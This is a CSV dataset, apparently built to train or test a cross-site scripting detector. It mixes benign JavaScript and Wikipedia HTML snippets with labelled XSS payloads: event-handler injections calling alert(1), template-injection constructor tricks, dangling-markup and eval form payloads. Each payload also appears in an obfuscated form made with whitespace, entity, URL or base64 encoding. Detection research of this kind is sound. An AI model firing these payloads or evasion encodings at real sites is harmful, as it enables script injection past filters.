sample_id,label,payload_original,payload_obfuscated,generator,recipe
17,0,"<li><a href=""/wiki/citizen_science#plastics_and_pollution"" title=""citizen science"">citizen science </a> </li>","<li><a href=""/wiki/citizen_science#plastics_and_pollution"" title=""citizen science"">citizen science </a> </li>",tool_baseline,none
18,0,const toastliveexample = document.getelementbyid('livetoast') if (toasttrigger) { const toastbootstrap = bootstrap.toast.getorcreateinstance(toastliveexample),const toastliveexample = document.getelementbyid('livetoast') if (toasttrigger) { const toastbootstrap = bootstrap.toast.getorcreateinstance(toastliveexample),tool_baseline,none
19,0,return getwindowscroll(node); } else { return gethtmlelementscroll(node);,return getwindowscroll(node); } else { return gethtmlelementscroll(node);,tool_baseline,none
20,0,} ismanual = ismanual === undefined ? true : undefined; // default value true this.isopen = true;,} ismanual = ismanual === undefined ? true : undefined; // default value true this.isopen = true;,tool_baseline,none
21,1,"<del draggable=""true"" ondrag=""alert(1)"">test</del>","<del draggable=""true"" ondrag=""  alert(  1)"">test</del>",tool_baseline,whitespace_noise
22,0,"return acc; }, {}); return object.keys(overflows).sort(function (a, b) {","return acc; }, {}); return object.keys(overflows).sort(function (a, b) {",tool_baseline,none
23,0,} function getselectsingle_(el) { var selectedindex = el.selectedindex;,} function getselectsingle_(el) { var selectedindex = el.selectedindex;,tool_baseline,none
24,1,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",&lt;style&gt;@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}&lt;/style&gt;&lt;hr id=x style=&quot;position:absolute;&quot; onanimationcancel=&quot;alert(1)&quot;&gt;&lt;/hr&gt;,tool_baseline,html_entities
25,0,"const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding); this._element.removeattribute('aria-modal');","const completecallback = () => { this._element.classlist.remove(class_name_show$3, class_name_hiding); this._element.removeattribute('aria-modal');",tool_baseline,none
26,0,return slice.call(this); } return index < 0 ? this[index + this.length] : this[index];,return slice.call(this); } return index < 0 ? this[index + this.length] : this[index];,tool_baseline,none
27,0,const placement_bottomend = isrtl() ? 'bottom-start' : 'bottom-end' const placement_right = isrtl() ? 'left-start' : 'right-start' const placement_left = isrtl() ? 'right-start' : 'left-start',const placement_bottomend = isrtl() ? 'bottom-start' : 'bottom-end' const placement_right = isrtl() ? 'left-start' : 'right-start' const placement_left = isrtl() ? 'right-start' : 'left-start',tool_baseline,none
28,0,jqueryevent.preventdefault(); } return evt;,jqueryevent.preventdefault(); } return evt;,tool_baseline,none
29,1,"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del>","<style>:target {color:red;}</ style><del id=x style=""transition:color 1s"" ontransitionend=alert(1)></del> ",tool_baseline,whitespace_noise
30,0,"this._queuecallback(completecallback, this._element, true) } hide() {","this._queuecallback(completecallback, this._element, true) } hide() {",tool_baseline,none
31,0,var now = gettime(); if (!previous && options.leading === false) previous = now; var remaining = wait - (now - previous);,var now = gettime(); if (!previous && options.leading === false) previous = now; var remaining = wait - (now - previous);,tool_baseline,none
32,0,} if (opts.isdisabled) { arr.push('is-disabled');,} if (opts.isdisabled) { arr.push('is-disabled');,tool_baseline,none
33,1,"<div draggable=""true"" contenteditable>drag me</div><noembed ondrop=alert(1) contenteditable>drop here</noembed>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;noembed ondrop=alert(1) contenteditable&gt;drop here&lt;/noembed&gt;,tool_baseline,html_entities
34,0,setoptions: function setoptions(setoptionsaction) {,setoptions: function setoptions(setoptionsaction) {,tool_baseline,none
35,0,this.wrapper = this.$el.parent()[0]; this.waveel = $(this.wrapper).find('.tap-target-wave')[0]; this.originel = $(this.wrapper).find('.tap-target-origin')[0];,this.wrapper = this.$el.parent()[0]; this.waveel = $(this.wrapper).find('.tap-target-wave')[0]; this.originel = $(this.wrapper).find('.tap-target-origin')[0];,tool_baseline,none
36,0,prevmonth() { this.calendars[0].month--; this.adjustcalendars();,prevmonth() { this.calendars[0].month--; this.adjustcalendars();,tool_baseline,none
37,0,"</p><p>in the late 1990s and early 21st century, ai began to be used for logistics, <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, <a href=""/wiki/medical_diagnosis"" title=""medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-ai_widely_used_25-1"" class=""reference""><a href=""#cite_note-ai_widely_used-25"">&#91;25&#93; </a> </sup> the success was due to increasing computational power (see <a href=""/wiki/moore%27s_law"" title=""moore&#39;s law"">moore's law </a> and <a href=""/wiki/transistor_count"" title=""transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between ai and other fields (such as <a href=""/wiki/statistics"" title=""statistics"">statistics </a>, <a href=""/wiki/economics"" title=""economics"">economics </a> and <a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-formal_methods_in_ai_43-0"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/ibm_deep_blue"" class=""mw-redirect"" title=""ibm deep blue"">deep blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/garry_kasparov"" title=""garry kasparov"">garry kasparov </a>, on 11 may 1997.<sup id=""cite_ref-footnotemccorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-footnotemccorduck2004480–483-44"">&#91;44&#93; </a> </sup>","</p><p>in the late 1990s and early 21st century, ai began to be used for logistics, <a href=""/wiki/data_mining"" title=""data mining"">data mining </a>, <a href=""/wiki/medical_diagnosis"" title=""medical diagnosis"">medical diagnosis </a> and other areas.<sup id=""cite_ref-ai_widely_used_25-1"" class=""reference""><a href=""#cite_note-ai_widely_used-25"">&#91;25&#93; </a> </sup> the success was due to increasing computational power (see <a href=""/wiki/moore%27s_law"" title=""moore&#39;s law"">moore's law </a> and <a href=""/wiki/transistor_count"" title=""transistor count"">transistor count </a>), greater emphasis on solving specific problems, new ties between ai and other fields (such as <a href=""/wiki/statistics"" title=""statistics"">statistics </a>, <a href=""/wiki/economics"" title=""economics"">economics </a> and <a href=""/wiki/mathematical_optimization"" title=""mathematical optimization"">mathematics </a>), and a commitment by researchers to mathematical methods and scientific standards.<sup id=""cite_ref-formal_methods_in_ai_43-0"" class=""reference""><a href=""#cite_note-formal_methods_in_ai-43"">&#91;43&#93; </a> </sup> <a href=""/wiki/ibm_deep_blue"" class=""mw-redirect"" title=""ibm deep blue"">deep blue </a> became the first computer chess-playing system to beat a reigning world chess champion, <a href=""/wiki/garry_kasparov"" title=""garry kasparov"">garry kasparov </a>, on 11 may 1997.<sup id=""cite_ref-footnotemccorduck2004480–483_44-0"" class=""reference""><a href=""#cite_note-footnotemccorduck2004480–483-44"">&#91;44&#93; </a> </sup>",tool_baseline,none
38,0,if (expanded && parent !== expanded) { expanded.click() },if (expanded && parent !== expanded) { expanded.click() },tool_baseline,none
39,1,"<kbd oncut=""alert(1)"" contenteditable>test</kbd>",%3Ckbd%20oncut%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fkbd%3E,tool_baseline,urlencode
40,1,"<samp onclick=""alert(1)"">test</samp>",&lt;samp onclick=&quot;alert(1)&quot;&gt;test&lt;/samp&gt;,tool_baseline,html_entities
41,0,this.$el.removeclass('focus'),this.$el.removeclass('focus'),tool_baseline,none
42,0,if (!!_this9.options.container) { $(_this9.options.container).append(_this9.dropdownel); } else {,if (!!_this9.options.container) { $(_this9.options.container).append(_this9.dropdownel); } else {,tool_baseline,none
43,0,"k(d(a)); };g.pause = function () { var a = v.indexof(g);-1 < a && v.splice(a, 1);g.paused = !0;","k(d(a)); };g.pause = function () { var a = v.indexof(g);-1 < a && v.splice(a, 1);g.paused = !0;",tool_baseline,none
44,1,{{$emit.constructor`alert(1)`()}},e3skZW1pdC5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKX19,tool_baseline,base64
45,1,"<legend onbeforecopy=""alert(1)"" contenteditable>test</legend>","<legend onbeforecopy=""alert(1)"" contenteditable>test</legend/*OBF*/>",tool_baseline,comment_marker
46,1,"<blockquote ondblclick=""alert(1)"">test</blockquote>","<blockquote ondblclick=""alert(1)  "">test</blockquote>",tool_baseline,whitespace_noise
47,1,"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>","<div draggable=""true"" contenteditable>drag/*OBF*/ me</d/*OBF*/iv><blockquote ondragover=alert(1) contenteditab/*OBF*/le>drop her/*OBF*/e</blockquote>",tool_baseline,comment_marker
48,1,"<menu oncopy=""alert(1)"" contenteditable>test</menu>",%3Cmenu%20oncopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fmenu%3E,tool_baseline,urlencode
49,0,index_js.execute(callback); return; },index_js.execute(callback); return; },tool_baseline,none
50,1,<body onfocusout=alert(1) id=x><iframe id=x>,<  body onfocusout=  alert(1) id=x>< iframe id= x>,tool_baseline,whitespace_noise
51,0,value: function _handletargetclick(e) { this.open(); },value: function _handletargetclick(e) { this.open(); },tool_baseline,none
52,1,"<command onbeforecut=""alert(1)"" contenteditable>test</command>",%3Ccommand%20onbeforecut%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fcommand%3E,tool_baseline,urlencode
53,1,"<li onmouseup=""alert(1)"">test</li>",%3Cli%20onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fli%3E,tool_baseline,urlencode
54,0,if ($textarea[0].offsetwidth > 0 && $textarea[0].offsetheight > 0) {,if ($textarea[0].offsetwidth > 0 && $textarea[0].offsetheight > 0) {,tool_baseline,none
55,1,"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""","<embed src=http://subdomain1.portswigger-l/*OBF*/abs.net/dangling_markup/n/*OBF*/ame.html/*OBF*/ name=""",tool_baseline,comment_marker
56,0,} }); var camelcase = (function () {,} }); var camelcase = (function () {,tool_baseline,none
57,0,"}; var carousel = function (_component18) { _inherits(carousel, _component18);","}; var carousel = function (_component18) { _inherits(carousel, _component18);",tool_baseline,none
58,1,<figcaption onpointerup=alert(1)>xss</figcaption>,<figcaption onpointerup= alert(  1)>xss</figcaption>,tool_baseline,whitespace_noise
59,0,"}, dddd: () => { return this.options.i18n.weekdays[this.date.getday()];","}, dddd: () => { return this.options.i18n.weekdays[this.date.getday()];",tool_baseline,none
60,0,let taptargettexttop = istop ? taptargetheight / 2 : 0; let taptargettextbottom = 0; let taptargettextleft = isleft && !iscenterx ? taptargetwidth / 2 - originwidth : 0;,let taptargettexttop = istop ? taptargetheight / 2 : 0; let taptargettextbottom = 0; let taptargettextleft = isleft && !iscenterx ? taptargetwidth / 2 - originwidth : 0;,tool_baseline,none
61,1,"<title onkeyup=""alert(1)"" contenteditable>test</title>",%3Ctitle%20onkeyup%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Ftitle%3E,tool_baseline,urlencode
62,0,"top: [this.options.endingtop, this.options.startingtop],","top: [this.options.endingtop, this.options.startingtop],",tool_baseline,none
63,0,} const activeindex = this._getitemindex(this._getactive()) if (activeindex === index) {,} const activeindex = this._getitemindex(this._getactive()) if (activeindex === index) {,tool_baseline,none
64,0,value: function _handlefabclick() { if (this.isopen) { this.close();,value: function _handlefabclick() { if (this.isopen) { this.close();,tool_baseline,none
65,0,"e.preventdefault(); document.removeeventlistener('mouseup', this._handledocumentclickendbound); document.removeeventlistener('touchend', this._handledocumentclickendbound);","e.preventdefault(); document.removeeventlistener('mouseup', this._handledocumentclickendbound); document.removeeventlistener('touchend', this._handledocumentclickendbound);",tool_baseline,none
66,1,"<dd onmouseleave=""alert(1)"">test</dd>",%3Cdd%20onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fdd%3E,tool_baseline,urlencode
67,1,"<style onkeydown=""alert(1)"" contenteditable>test</style>","<style onkeydown=""alert(1)"" contenteditable>test</style>  ",tool_baseline,whitespace_noise
68,0,"} _handlecarouseldrag(e) { let x, y, delta, deltay;","} _handlecarouseldrag(e) { let x, y, delta, deltay;",tool_baseline,none
69,0,var clickpos = timepicker._pos(e),var clickpos = timepicker._pos(e),tool_baseline,none
70,0,"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 13–16 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 13–16 </li> </ul>",tool_baseline,none
71,0,"this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.dropdownel.removeeventlistener('mouseleave', this._handlemouseleavebound); } else {","this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.dropdownel.removeeventlistener('mouseleave', this._handlemouseleavebound); } else {",tool_baseline,none
72,1,<svg><animate onend=alert(1) attributename=x dur=1s>,<svg><animate onend=alert(1) attributename=x dur=  1s>,tool_baseline,whitespace_noise
73,1,<th id=x tabindex=1 onfocus=alert(1)></th>,<th id=x tabindex=1 onfocus=alert( 1)><  /th>,tool_baseline,whitespace_noise
74,0,if (!hrefattribute || !hrefattribute.includes('#') && !hrefattribute.startswith('.')) { return null; },if (!hrefattribute || !hrefattribute.includes('#') && !hrefattribute.startswith('.')) { return null; },tool_baseline,none
75,1,<big onpointermove=alert(1)>xss</big>,<big onpointermove=alert(  1)>xss</  big>,tool_baseline,whitespace_noise
76,1,"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>","<div draggable="" true"" contenteditable>drag me< /div>  <dl ondragover=alert(  1) contenteditable>drop here</dl>",tool_baseline,whitespace_noise
77,0,if ( value >= xval.slice(-1)[0] ){ return 100; },if ( value >= xval.slice(-1)[0] ){ return 100; },tool_baseline,none
78,0,for (let c = 0; c < 1; c++) { this._renderdatedisplay(); html +=,for (let c = 0; c < 1; c++) { this._renderdatedisplay(); html +=,tool_baseline,none
79,1,<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,%3Cwbr%20onblur%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Fwbr%3E%3Cinput%20autofocus%3E,tool_baseline,urlencode
80,0,"} if ( lookforward && handlenumber < scope_handles.length - 1 ) { to = math.min(to, reference[handlenumber + 1] - options.margin);","} if ( lookforward && handlenumber < scope_handles.length - 1 ) { to = math.min(to, reference[handlenumber + 1] - options.margin);",tool_baseline,none
81,0,config.parent = index_js.getelement(config.parent); return config; },config.parent = index_js.getelement(config.parent); return config; },tool_baseline,none
82,0,"<li id=""cite_note-footnoterussellnorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnoterussellnorvig200916_30-0"">^ </a> </b>","<li id=""cite_note-footnoterussellnorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnoterussellnorvig200916_30-0"">^ </a> </b>",tool_baseline,none
83,0,"scale: [0.4, 1], translatey: [this.offsety, 0], translatex: [this.offsetx, 0],","scale: [0.4, 1], translatey: [this.offsety, 0], translatex: [this.offsetx, 0],",tool_baseline,none
84,0,"<h4><span class=""mw-headline"" id=""logic-based"">logic-based","<h4><span class=""mw-headline"" id=""logic-based"">logic-based",tool_baseline,none
85,1,"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>","<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",tool_baseline,whitespace_noise
86,1,"<area oncopy=""alert(1)"" contenteditable>test</area>",PGFyZWEgb25jb3B5PSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L2FyZWE+,tool_baseline,base64
87,0,const event_hide = `hide${event_key}` const event_hidden = `hidden${event_key}` const event_show = `show${event_key}`,const event_hide = `hide${event_key}` const event_hidden = `hidden${event_key}` const event_show = `show${event_key}`,tool_baseline,none
88,1,"<button onbeforecopy=""alert(1)"" contenteditable>test</button>","<button onbeforecopy= ""alert(1)""  contenteditable>test</button>",tool_baseline,whitespace_noise
89,0,previous = previous.previouselementsibling } return [],previous = previous.previouselementsibling } return [],tool_baseline,none
90,0,"} form.classlist.add('was-validated') }, false)","} form.classlist.add('was-validated') }, false)",tool_baseline,none
91,1,"<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></th>","<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontrans/*OBF*/itioncancel=alert(1)></th>",tool_baseline,comment_marker
92,1,"<optgroup onbeforepaste=""alert(1)"" contenteditable>test</optgroup>","<optgroup onbeforepaste=""alert(1)"" contenteditable>test<  /  optgroup>",tool_baseline,whitespace_noise
93,0,var ownelement = getwindow(node).element,var ownelement = getwindow(node).element,tool_baseline,none
94,1,<object onpointerout=alert(1)>xss</object>,PG9iamVjdCBvbnBvaW50ZXJvdXQ9YWxlcnQoMSk+eHNzPC9vYmplY3Q+,tool_baseline,base64
95,0,this._handlerangemouseuptouchendbound = this._handlerangemouseuptouchend.bind(this),this._handlerangemouseuptouchendbound = this._handlerangemouseuptouchend.bind(this),tool_baseline,none
96,1,<x @[_b.constructor`alert(1)`()]>,PHggQFtfYi5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKV0+,tool_baseline,base64
97,0,return order === order_prev ? direction_right : direction_left; } static jqueryinterface(config) {,return order === order_prev ? direction_right : direction_left; } static jqueryinterface(config) {,tool_baseline,none
98,0,"<li><a href=""/wiki/list_of_artificial_intelligence_projects"" title=""list of artificial intelligence projects"">projects </a> </li>","<li><a href=""/wiki/list_of_artificial_intelligence_projects"" title=""list of artificial intelligence projects"">projects </a> </li>",tool_baseline,none
99,0,"<a href=""/wiki/applied_information_economics"" title=""applied information economics"">information value theory </a>:","<a href=""/wiki/applied_information_economics"" title=""applied information economics"">information value theory </a>:",tool_baseline,none
100,0,"<li><cite id=""citerefacm1998"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20071012025921/http://www.acm.org/class/1998/i.2.html"">""acm computing classification system: artificial intelligence"" </a>. <a href=""/wiki/association_for_computing_machinery"" title=""association for computing machinery"">acm </a>. 1998. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.acm.org/class/1998/i.2.html"">the original </a> on 12 october 2007<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 august","<li><cite id=""citerefacm1998"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20071012025921/http://www.acm.org/class/1998/i.2.html"">""acm computing classification system: artificial intelligence"" </a>. <a href=""/wiki/association_for_computing_machinery"" title=""association for computing machinery"">acm </a>. 1998. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.acm.org/class/1998/i.2.html"">the original </a> on 12 october 2007<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 august",tool_baseline,none
101,0,"<li><cite id=""citerefdowehajek1997"" class=""citation journal"">dowe, d. l.; hajek, a. r. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""a computational extension to the turing test"" </a>. <i>proceedings of the 4th conference of the australasian cognitive science society </i>. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 june 2011. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=proceedings+of+the+4th+conference+of+the+australasian+cognitive+science+society&amp;rft.atitle=a+computational+extension+to+the+turing+test&amp;rft.date=1997&amp;rft.aulast=dowe&amp;rft.aufirst=d.+l.&amp;rft.au=hajek%2c+a.+r.&amp;rft_id=http%3a%2f%2fwww.csse.monash.edu.au%2fpublications%2f1997%2ftr-cs97-322-abs.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","<li><cite id=""citerefdowehajek1997"" class=""citation journal"">dowe, d. l.; hajek, a. r. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""a computational extension to the turing test"" </a>. <i>proceedings of the 4th conference of the australasian cognitive science society </i>. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 june 2011. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=proceedings+of+the+4th+conference+of+the+australasian+cognitive+science+society&amp;rft.atitle=a+computational+extension+to+the+turing+test&amp;rft.date=1997&amp;rft.aulast=dowe&amp;rft.aufirst=d.+l.&amp;rft.au=hajek%2c+a.+r.&amp;rft_id=http%3a%2f%2fwww.csse.monash.edu.au%2fpublications%2f1997%2ftr-cs97-322-abs.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",tool_baseline,none
102,1,"<area onmouseover=""alert(1)"">test</area>",&lt;area onmouseover=&quot;alert(1)&quot;&gt;test&lt;/area&gt;,tool_baseline,html_entities
103,0,"return eventend(event, data)","return eventend(event, data)",tool_baseline,none
104,0,"1 ), visibledate = date.gettime();","1 ), visibledate = date.gettime();",tool_baseline,none
105,0,} _getoffset() { const { offset } = this._config,} _getoffset() { const { offset } = this._config,tool_baseline,none
106,1,"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""xss via target in a form""></form>",PGZvcm0gYWN0aW9uPSJodHRwOi8vc3ViZG9tYWluMS5wb3J0c3dpZ2dlci1sYWJzLm5ldC94c3MveHNzLnBocCIgdGFyZ2V0PSJhbGVydCgxKSI+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9eCB2YWx1ZT0iJztldmFsKG5hbWUpLy8iPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWNvbnRleHQgdmFsdWU9anNfc3RyaW5nX3NpbmdsZT48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0ieHNzIHZpYSB0YXJnZXQgaW4gYSBmb3JtIj48L2Zvcm0+,tool_baseline,base64
107,1,"<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>","<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>",tool_baseline,comment_marker
108,0,} _animatein() { this._positiontooltip();,} _animatein() { this._positiontooltip();,tool_baseline,none
109,0,}; }()); var getprefixedprop = (function () {,}; }()); var getprefixedprop = (function () {,tool_baseline,none
110,1,"<thead onkeypress=""alert(1)"" contenteditable>test</thead>","<thead onkeypress=""  alert(1)  ""   contenteditable>test<  /thead>",tool_baseline,whitespace_noise
111,0,"<li><a href=""/wiki/idealism"" title=""idealism"">idealism </a> </li>","<li><a href=""/wiki/idealism"" title=""idealism"">idealism </a> </li>",tool_baseline,none
112,1,"<div onbeforecut=""alert(1)"" contenteditable>test</div>","<div onbeforecut=""alert(1)"" contenteditable>test</div>",tool_baseline,whitespace_noise
113,1,<marquee onpointerup=alert(1)>xss</marquee>,<marquee o/*OBF*/npointeru/*OBF*/p=alert(1)>xss</marquee>,tool_baseline,comment_marker
114,1,<shadow onpointerover=alert(1)>xss</shadow>,PHNoYWRvdyBvbnBvaW50ZXJvdmVyPWFsZXJ0KDEpPnhzczwvc2hhZG93Pg==,tool_baseline,base64
115,0,"} // eslint-disable-next-line import/no-unused-modules const popperoffsets$1 = { name: 'popperoffsets',","} // eslint-disable-next-line import/no-unused-modules const popperoffsets$1 = { name: 'popperoffsets',",tool_baseline,none
116,1,"<em ondblclick=""alert(1)"">test</em>","<em ondblclick=""alert(1) "">test</em>",tool_baseline,whitespace_noise
117,0,"<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">debugging memory leaks","<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">debugging memory leaks",tool_baseline,none
118,0,let indicator = document.createelement('li'),let indicator = document.createelement('li'),tool_baseline,none
119,1,<tbody onpointermove=alert(1)>xss</tbody>,<tbody onpointermove=alert(1)>xss</tbody>,tool_baseline,whitespace_noise
120,0,"key: ""render"", value: function render(year, month, randid) { var opts = this.options,","key: ""render"", value: function render(year, month, randid) { var opts = this.options,",tool_baseline,none
121,0,"value: function rendertable(opts, data, randid) {","value: function rendertable(opts, data, randid) {",tool_baseline,none
122,1,"<b onclick=""alert(1)"">test</b>",PGIgb25jbGljaz0iYWxlcnQoMSkiPnRlc3Q8L2I+,tool_baseline,base64
